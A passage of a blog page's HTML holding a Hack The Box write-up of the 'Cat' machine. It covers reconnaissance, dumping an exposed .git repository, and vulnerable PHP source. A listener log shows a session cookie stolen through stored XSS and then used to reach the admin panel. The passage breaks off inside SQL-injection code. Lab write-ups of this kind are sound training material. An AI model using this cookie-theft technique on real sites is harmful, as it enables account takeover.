@@ -1,0 +1,831 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://fouedsaidi.com/2025/07/04/hackthebox-cat/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewCat is a medium-difficulty machine from Hack The Box dealing initially with an exposed git directory allowing for source code review which reveals an XSS and SQLI vulnerabilities. We’ll use th">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: Cat">
+<meta property="og:url" content="http://fouedsaidi.com/2025/07/04/Hackthebox-Cat/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewCat is a medium-difficulty machine from Hack The Box dealing initially with an exposed git directory allowing for source code review which reveals an XSS and SQLI vulnerabilities. We’ll use th">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Cat/Cat.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Cat/xss.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Cat/xss1.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Cat/admin.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Cat/gitea.png">
+<meta property="article:published_time" content="2025-07-04T13:57:59.000Z">
+<meta property="article:modified_time" content="2025-07-04T14:41:38.000Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Cat/Cat.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: Cat -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":"https://www.instagram.com/saidi.foued/","zhihu":null,"twitter":"https://twitter.com/_kujen5","email":"foued.saidi.pro@gmail.com","linkedin":"https://www.linkedin.com/in/foued-saidi-pro/","facebook":"https://www.facebook.com/foued.saidi.980/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: Cat</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-07-04 14:57:59</span>
+        <span class="mobile">2025-07-04 14:57:59</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-07-04 15:41:38</span>
+            <span class="mobile">2025-07-04 15:41:38</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Cat is a medium-difficulty machine from Hack The Box dealing initially with an exposed git directory allowing for source code review which reveals an XSS and SQLI vulnerabilities. We’ll use the XSS to get to admin panel and then from an admin endpoint perform SQLI to get user creds and user flag. We eventually exploit CVE-2024-6886 which is a stored XSS in an internal instance of Gitea to get root credentials.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Cat/Cat.png"
+                      alt="Cat-info-card"
+                ><figcaption>Cat-info-card</figcaption></figure></p>
+<h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 96:2d:f5:c6:f6:9f:59:60:e5:65:85:ab:49:e4:76:14 (RSA)</span><br><span class="line">|   256 9e:c4:a4:40:e9:da:cc:62:d1:d6:5a:2f:9e:7b:d4:aa (ECDSA)</span><br><span class="line">|_  256 6e:22:2a:6a:6d:eb:de:19:b7:16:97:c2:7e:89:29:d5 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http://cat.htb/</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>We have our usual ssh and http ports where we’re redirected to <code>cat.htb</code> which we’ll add to our <code>/etc/hosts</code> file.</p>
+<h3 id="Directory-Bruteforcing"><a href="#Directory-Bruteforcing" class="headerlink" title="Directory Bruteforcing"></a>Directory Bruteforcing</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ dirsearch -u http://cat.htb/</span><br><span class="line">                                                                                                                                            </span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460</span><br><span class="line"></span><br><span class="line">Output File: /home/kali/Desktop/reports/http_cat.htb/__25-02-07_17-30-45.txt</span><br><span class="line"></span><br><span class="line">Target: http://cat.htb/</span><br><span class="line"></span><br><span class="line">[17:30:45] Starting:                                                                                                                                                                                 </span><br><span class="line">[17:30:50] 301 -  301B  - /.git  -&gt;  http://cat.htb/.git/                   </span><br><span class="line">[17:30:50] 200 -   92B  - /.git/config                                      </span><br><span class="line">[17:30:50] 200 -    7B  - /.git/COMMIT_EDITMSG</span><br><span class="line">[17:30:50] 403 -  272B  - /.git/</span><br><span class="line">[17:30:50] 200 -   73B  - /.git/description</span><br><span class="line">[17:30:50] 403 -  272B  - /.git/branches/</span><br><span class="line">[17:30:50] 200 -   23B  - /.git/HEAD</span><br><span class="line">[17:30:50] 403 -  272B  - /.git/hooks/                                      </span><br><span class="line">[17:30:50] 200 -    2KB - /.git/index                                       </span><br><span class="line">[17:30:51] 200 -  240B  - /.git/info/exclude                                </span><br><span class="line">[17:30:51] 403 -  272B  - /.git/info/</span><br><span class="line">[17:30:51] 403 -  272B  - /.git/logs/</span><br><span class="line">[17:30:51] 301 -  311B  - /.git/logs/refs  -&gt;  http://cat.htb/.git/logs/refs/</span><br><span class="line">[17:30:51] 200 -  150B  - /.git/logs/refs/heads/master                      </span><br><span class="line">[17:30:51] 200 -  150B  - /.git/logs/HEAD</span><br><span class="line">[17:30:51] 301 -  317B  - /.git/logs/refs/heads  -&gt;  http://cat.htb/.git/logs/refs/heads/</span><br><span class="line">[17:30:51] 403 -  272B  - /.git/objects/                                    </span><br><span class="line">[17:30:51] 301 -  312B  - /.git/refs/heads  -&gt;  http://cat.htb/.git/refs/heads/</span><br><span class="line">[17:30:51] 403 -  272B  - /.git/refs/</span><br><span class="line">[17:30:51] 200 -   41B  - /.git/refs/heads/master</span><br><span class="line">[17:30:51] 301 -  311B  - /.git/refs/tags  -&gt;  http://cat.htb/.git/refs/tags/</span><br><span class="line">[17:30:51] 403 -  272B  - /.ht_wsr.txt                                      </span><br><span class="line">[17:30:51] 403 -  272B  - /.htaccess.bak1                                   </span><br><span class="line">[17:30:51] 403 -  272B  - /.htaccess.orig                                   </span><br><span class="line">[17:30:51] 403 -  272B  - /.htaccess.save</span><br><span class="line">[17:30:51] 403 -  272B  - /.htaccess.sample</span><br><span class="line">[17:30:51] 403 -  272B  - /.htaccess_extra</span><br><span class="line">[17:30:51] 403 -  272B  - /.htaccess_sc                                     </span><br><span class="line">[17:30:51] 403 -  272B  - /.htaccessOLD                                     </span><br><span class="line">[17:30:51] 403 -  272B  - /.htaccessBAK</span><br><span class="line">[17:30:51] 403 -  272B  - /.htaccess_orig</span><br><span class="line">[17:30:51] 403 -  272B  - /.htaccessOLD2</span><br><span class="line">[17:30:51] 403 -  272B  - /.htm                                             </span><br><span class="line">[17:30:51] 403 -  272B  - /.html                                            </span><br><span class="line">[17:30:51] 403 -  272B  - /.htpasswd_test                                   </span><br><span class="line">[17:30:51] 403 -  272B  - /.htpasswds</span><br><span class="line">[17:30:51] 403 -  272B  - /.httr-oauth</span><br></pre></td></tr></table></figure></div>
+
+<p>Running dirsearch against our web app, we can see that we have an exposed <code>.git</code> directory which could lead to exposed source code.</p>
+<h2 id="XSS-in-http-cat-htb"><a href="#XSS-in-http-cat-htb" class="headerlink" title="XSS in http://cat.htb"></a>XSS in <a class="link"   target="_blank" rel="noopener" href="http://cat.htb/" >http://cat.htb <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h2><p>We can do ahead and download the git repository using git-dumper:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Hackthebox/CAT/git-dumper/cat_git]</span><br><span class="line">└─$ tree                                               </span><br><span class="line">.</span><br><span class="line">├── accept_cat.php</span><br><span class="line">├── admin.php</span><br><span class="line">├── config.php</span><br><span class="line">├── contest.php</span><br><span class="line">├── css</span><br><span class="line">│   └── styles.css</span><br><span class="line">├── delete_cat.php</span><br><span class="line">├── img</span><br><span class="line">│   ├── cat1.jpg</span><br><span class="line">│   ├── cat2.png</span><br><span class="line">│   └── cat3.webp</span><br><span class="line">├── img_winners</span><br><span class="line">│   ├── cat1.jpg</span><br><span class="line">│   ├── cat2.png</span><br><span class="line">│   └── cat3.webp</span><br><span class="line">├── index.php</span><br><span class="line">├── join.php</span><br><span class="line">├── logout.php</span><br><span class="line">├── view_cat.php</span><br><span class="line">├── vote.php</span><br><span class="line">├── winners</span><br><span class="line">│   └── cat_report_20240831_173129.php</span><br><span class="line">└── winners.php</span><br><span class="line"></span><br><span class="line">5 directories, 19 files</span><br></pre></td></tr></table></figure></div>
+
+<p>Looking at <code>join.php</code>:</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;GET&quot;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;registerForm&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]; <span class="comment">// unsanitzed</span></span><br><span class="line">    <span class="variable">$email</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;email&#x27;</span>]; <span class="comment">// unsanitzed</span></span><br><span class="line">    <span class="variable">$password</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$stmt_check</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM users WHERE username = :username OR email = :email&quot;</span>);</span><br><span class="line">    <span class="variable">$stmt_check</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="string">&#x27;:username&#x27;</span> =&gt; <span class="variable">$username</span>, <span class="string">&#x27;:email&#x27;</span> =&gt; <span class="variable">$email</span>]);</span><br><span class="line">    <span class="variable">$existing_user</span> = <span class="variable">$stmt_check</span>-&gt;<span class="title function_ invoke__">fetch</span>(PDO::<span class="variable constant_">FETCH_ASSOC</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$existing_user</span>) &#123;</span><br><span class="line">        <span class="variable">$error_message</span> = <span class="string">&quot;Error: Username or email already exists.&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$stmt_insert</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;INSERT INTO users (username, email, password) VALUES (:username, :email, :password)&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt_insert</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="string">&#x27;:username&#x27;</span> =&gt; <span class="variable">$username</span>, <span class="string">&#x27;:email&#x27;</span> =&gt; <span class="variable">$email</span>, <span class="string">&#x27;:password&#x27;</span> =&gt; <span class="variable">$password</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$stmt_insert</span>) &#123;</span><br><span class="line">            <span class="variable">$success_message</span> = <span class="string">&quot;Registration successful!&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$error_message</span> = <span class="string">&quot;Error: Unable to register user.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>We can notice that there is an unsatized username parameter, so we can inject an xss payload in it and since it gets rendered on the web app it will get triggered:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Cat/xss.png"
+                      alt="XSS"
+                ><figcaption>XSS</figcaption></figure></p>
+<p>And then we can register a cat and our payload will be triggered since it’s being checked by an admin:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Cat/xss1.png"
+                      alt="XSS"
+                ><figcaption>XSS</figcaption></figure></p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ python3 -m http.server 80</span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span><br><span class="line">10.129.41.129 - - [07/Feb/2025 17:46:47] <span class="string">&quot;GET /?c=PHPSESSID=731vo0m0ai6ppirlc86o6fttk8 HTTP/1.1&quot;</span> 200 -</span><br><span class="line">10.129.41.129 - - [07/Feb/2025 17:46:47] code 404, message File not found</span><br><span class="line">10.129.41.129 - - [07/Feb/2025 17:46:47] <span class="string">&quot;GET /favicon.ico HTTP/1.1&quot;</span> 404 -</span><br></pre></td></tr></table></figure></div>
+
+
+<p>We can now use that token and access admin panel with it:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Cat/admin.png"
+                      alt="XSS"
+                ><figcaption>XSS</figcaption></figure></p>
+<p>Also returning to the source code, we can find an SQL Injection inside accept_cat.php:</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&#x27;axel&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;catId&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span 